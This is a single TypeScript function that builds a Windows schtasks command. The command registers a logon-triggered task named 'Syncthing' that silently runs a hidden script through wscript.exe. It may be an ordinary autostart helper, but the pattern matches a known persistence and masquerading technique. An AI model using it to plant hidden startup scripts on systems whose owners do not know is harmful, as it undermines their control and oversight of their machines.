export function buildScheduledTaskCommand(hiddenScriptPath: string): string {
  return `schtasks /create /sc onlogon /tn Syncthing /tr "C:\\Windows\\System32\\wscript.exe \"${hiddenScriptPath}\"" /f`
}